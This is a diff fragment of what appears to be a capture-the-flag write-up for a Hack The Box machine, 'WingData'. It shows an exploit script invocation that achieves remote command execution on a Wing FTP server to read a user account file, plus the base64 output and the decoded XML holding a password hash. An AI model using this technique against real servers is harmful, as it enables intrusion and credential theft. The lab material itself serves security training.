@@ -280,3 +280,132 @@ after encode it output is :
 </USER_ACCOUNTS>
 ```
 
+```
+ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "base64 Data/1/users/john.xml"
+
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'base64 Data/1/users/john.xml' and username: 'anonymous'
+[+] UID extracted: 888b84c17980b5b0089295e74424a9f4f528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 888b84c17980b5b0089295e74424a9f4f528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---
+PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8VVNFUl9BQ0NPVU5UUyBEZXNjcmlwdGlvbj0iV2luZyBG
+VFAgU2VydmVyIFVzZXIgQWNjb3VudHMiPgogICAgPFVTRVI+CiAgICAgICAgPFVzZXJOYW1lPmpv
+aG48L1VzZXJOYW1lPgogICAgICAgIDxFbmFibGVBY2NvdW50PjE8L0VuYWJsZUFjY291bnQ+CiAg
+ICAgICAgPEVuYWJsZVBhc3N3b3JkPjE8L0VuYWJsZVBhc3N3b3JkPgogICAgICAgIDxQYXNzd29y
+ZD5jMWYxNDY3MmZlZWMzYmJhMjcyMzEwNDgyNzFmY2RjZGRlYjlkNzVlZjc5ZjY4ODkxMzlhYTc4
+YzlkMzk4ZjEwPC9QYXNzd29yZD4KICAgICAgICA8UHJvdG9jb2xUeXBlPjYzPC9Qcm90b2NvbFR5
+cGU+CiAgICAgICAgPEVuYWJsZUV4cGlyZT4wPC9FbmFibGVFeHBpcmU+CiAgICAgICAgPEV4cGly
+ZVRpbWU+MjAyNS0xMi0wMiAxMToxMzowMDwvRXhwaXJlVGltZT4KICAgICAgICA8TWF4RG93bmxv
+YWRTcGVlZFBlclNlc3Npb24+MDwvTWF4RG93bmxvYWRTcGVlZFBlclNlc3Npb24+CiAgICAgICAg
+PE1heFVwbG9hZFNwZWVkUGVyU2Vzc2lvbj4wPC9NYXhVcGxvYWRTcGVlZFBlclNlc3Npb24+CiAg
+ICAgICAgPE1heERvd25sb2FkU3BlZWRQZXJVc2VyPjA8L01heERvd25sb2FkU3BlZWRQZXJVc2Vy
+PgogICAgICAgIDxNYXhVcGxvYWRTcGVlZFBlclVzZXI+MDwvTWF4VXBsb2FkU3BlZWRQZXJVc2Vy
+PgogICAgICAgIDxTZXNzaW9uTm9Db21tYW5kVGltZU91dD41PC9TZXNzaW9uTm9Db21tYW5kVGlt
+ZU91dD4KICAgICAgICA8U2Vzc2lvbk5vVHJhbnNmZXJUaW1lT3V0PjU8L1Nlc3Npb25Ob1RyYW5z
+ZmVyVGltZU91dD4KICAgICAgICA8TWF4Q29ubmVjdGlvbj4wPC9NYXhDb25uZWN0aW9uPgogICAg
+ICAgIDxDb25uZWN0aW9uUGVySXA+MDwvQ29ubmVjdGlvblBlcklwPgogICAgICAgIDxQYXNzd29y
+ZExlbmd0aD4wPC9QYXNzd29yZExlbmd0aD4KICAgICAgICA8U2hvd0hpZGRlbkZpbGU+MDwvU2hv
+d0hpZGRlbkZpbGU+CiAgICAgICAgPENhbkNoYW5nZVBhc3N3b3JkPjA8L0NhbkNoYW5nZVBhc3N3
+b3JkPgogICAgICAgIDxDYW5TZW5kTWVzc2FnZVRvU2VydmVyPjA8L0NhblNlbmRNZXNzYWdlVG9T
+ZXJ2ZXI+CiAgICAgICAgPEVuYWJsZVNTSFB1YmxpY0tleUF1dGg+MDwvRW5hYmxlU1NIUHVibGlj
+S2V5QXV0aD4KICAgICAgICA8U1NIUHVibGljS2V5UGF0aD48L1NTSFB1YmxpY0tleVBhdGg+CiAg
+ICAgICAgPFNTSEF1dGhNZXRob2Q+MDwvU1NIQXV0aE1ldGhvZD4KICAgICAgICA8RW5hYmxlV2Vi
+bGluaz4xPC9FbmFibGVXZWJsaW5rPgogICAgICAgIDxFbmFibGVVcGxpbms+MTwvRW5hYmxlVXBs
+aW5rPgogICAgICAgIDxFbmFibGVUd29GYWN0b3I+MDwvRW5hYmxlVHdvRmFjdG9yPgogICAgICAg
+IDxUd29GYWN0b3JDb2RlPjwvVHdvRmFjdG9yQ29kZT4KICAgICAgICA8RXh0cmFJbmZvPjwvRXh0
+cmFJbmZvPgogICAgICAgIDxDdXJyZW50Q3JlZGl0PjA8L0N1cnJlbnRDcmVkaXQ+CiAgICAgICAg
+PFJhdGlvRG93bmxvYWQ+MTwvUmF0aW9Eb3dubG9hZD4KICAgICAgICA8UmF0aW9VcGxvYWQ+MTwv
+UmF0aW9VcGxvYWQ+CiAgICAgICAgPFJhdGlvQ291bnRNZXRob2Q+MDwvUmF0aW9Db3VudE1ldGhv
+ZD4KICAgICAgICA8RW5hYmxlUmF0aW8+MDwvRW5hYmxlUmF0aW8+CiAgICAgICAgPE1heFF1b3Rh
+PjA8L01heFF1b3RhPgogICAgICAgIDxDdXJyZW50UXVvdGE+MDwvQ3VycmVudFF1b3RhPgogICAg
+ICAgIDxFbmFibGVRdW90YT4wPC9FbmFibGVRdW90YT4KICAgICAgICA8Tm90ZXNOYW1lPjwvTm90
+ZXNOYW1lPgogICAgICAgIDxOb3Rlc0FkZHJlc3M+PC9Ob3Rlc0FkZHJlc3M+CiAgICAgICAgPE5v
+dGVzWmlwQ29kZT48L05vdGVzWmlwQ29kZT4KICAgICAgICA8Tm90ZXNQaG9uZT48L05vdGVzUGhv
+bmU+CiAgICAgICAgPE5vdGVzRmF4PjwvTm90ZXNGYXg+CiAgICAgICAgPE5vdGVzRW1haWw+PC9O
+b3Rlc0VtYWlsPgogICAgICAgIDxOb3Rlc01lbW8+PC9Ob3Rlc01lbW8+CiAgICAgICAgPEVuYWJs
+ZVVwbG9hZExpbWl0PjA8L0VuYWJsZVVwbG9hZExpbWl0PgogICAgICAgIDxDdXJMaW1pdFVwbG9h
+ZFNpemU+MDwvQ3VyTGltaXRVcGxvYWRTaXplPgogICAgICAgIDxNYXhMaW1pdFVwbG9hZFNpemU+
+MDwvTWF4TGltaXRVcGxvYWRTaXplPgogICAgICAgIDxFbmFibGVEb3dubG9hZExpbWl0PjA8L0Vu
+YWJsZURvd25sb2FkTGltaXQ+CiAgICAgICAgPEN1ckxpbWl0RG93bmxvYWRMaW1pdD4wPC9DdXJM
+aW1pdERvd25sb2FkTGltaXQ+CiAgICAgICAgPE1heExpbWl0RG93bmxvYWRMaW1pdD4wPC9NYXhM
+aW1pdERvd25sb2FkTGltaXQ+CiAgICAgICAgPExpbWl0UmVzZXRUeXBlPjA8L0xpbWl0UmVzZXRU
+eXBlPgogICAgICAgIDxMaW1pdFJlc2V0VGltZT4xNzYyMDk5OTg1PC9MaW1pdFJlc2V0VGltZT4K
+ICAgICAgICA8VG90YWxSZWNlaXZlZEJ5dGVzPjA8L1RvdGFsUmVjZWl2ZWRCeXRlcz4KICAgICAg
+ICA8VG90YWxTZW50Qnl0ZXM+MDwvVG90YWxTZW50Qnl0ZXM+CiAgICAgICAgPExvZ2luQ291bnQ+
+MDwvTG9naW5Db3VudD4KICAgICAgICA8RmlsZURvd25sb2FkPjA8L0ZpbGVEb3dubG9hZD4KICAg
+ICAgICA8RmlsZVVwbG9hZD4wPC9GaWxlVXBsb2FkPgogICAgICAgIDxGYWlsZWREb3dubG9hZD4w
+PC9GYWlsZWREb3dubG9hZD4KICAgICAgICA8RmFpbGVkVXBsb2FkPjA8L0ZhaWxlZFVwbG9hZD4K
+ICAgICAgICA8TGFzdExvZ2luSXA+PC9MYXN0TG9naW5JcD4KICAgICAgICA8TGFzdExvZ2luVGlt
+ZT4yMDI1LTExLTAyIDExOjEzOjA1PC9MYXN0TG9naW5UaW1lPgogICAgICAgIDxFbmFibGVTY2hl
+ZHVsZT4wPC9FbmFibGVTY2hlZHVsZT4KICAgIDwvVVNFUj4KPC9VU0VSX0FDQ09VTlRTPgo=
+----------------------
+```
+
+```
+<?xml version="1.0" ?>
+<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
+    <USER>
+        <UserName>john</UserName>
+        <EnableAccount>1</EnableAccount>
+        <EnablePassword>1</EnablePassword>
+        <Password>c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10</Password>
+        <ProtocolType>63</ProtocolType>
+        <EnableExpire>0</EnableExpire>
+        <ExpireTime>2025-12-02 11:13:00</ExpireTime>
+        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
+        <MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>
+        <MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>
+        <MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>
+        <SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>
+        <SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>
+        <MaxConnection>0</MaxConnection>
+        <ConnectionPerIp>0</ConnectionPerIp>
+        <PasswordLength>0</PasswordLength>
+        <ShowHiddenFile>0</ShowHiddenFile>
+        <CanChangePassword>0</CanChangePassword>
+        <CanSendMessageToServer>0</CanSendMessageToServer>
+        <EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>
+        <SSHPublicKeyPath></SSHPublicKeyPath>
+        <SSHAuthMethod>0</SSHAuthMethod>
+        <EnableWeblink>1</EnableWeblink>
+        <EnableUplink>1</EnableUplink>
+        <EnableTwoFactor>0</EnableTwoFactor>
+        <TwoFactorCode></TwoFactorCode>
+        <ExtraInfo></ExtraInfo>
+        <CurrentCredit>0</CurrentCredit>
+        <RatioDownload>1</RatioDownload>
+        <RatioUpload>1</RatioUpload>
+        <RatioCountMethod>0</RatioCountMethod>
+        <EnableRatio>0</EnableRatio>
+        <MaxQuota>0</MaxQuota>
+        <CurrentQuota>0</CurrentQuota>
+        <EnableQuota>0</EnableQuota>
+        <NotesName></NotesName>
+        <NotesAddress></NotesAddress>
+        <NotesZipCode></NotesZipCode>
+        <NotesPhone></NotesPhone>
+        <NotesFax></NotesFax>
+        <NotesEmail></NotesEmail>
+        <NotesMemo></NotesMemo>
+        <EnableUploadLimit>0</EnableUploadLimit>
+        <CurLimitUploadSize>0</CurLimitUploadSize>
+        <MaxLimitUploadSize>0</MaxLimitUploadSize>
+        <EnableDownloadLimit>0</EnableDownloadLimit>
+        <CurLimitDownloadLimit>0</CurLimitDownloadLimit>
+        <MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>
+        <LimitResetType>0</LimitResetType>
+        <LimitResetTime>1762099985</LimitResetTime>
+        <TotalReceivedBytes>0</TotalReceivedBytes>
+        <TotalSentBytes>0</TotalSentBytes>
+        <LoginCount>0</LoginCount>
+        <FileDownload>0</FileDownload>
+        <FileUpload>0</FileUpload>
+        <FailedDownload>0</FailedDownload>
+        <FailedUpload>0</FailedUpload>
+        <LastLoginIp></LastLoginIp>
+        <LastLoginTime>2025-11-02 11:13:05</LastLoginTime>
+        <EnableSchedule>0</EnableSchedule>
+    </USER>
+</USER_ACCOUNTS>
+```
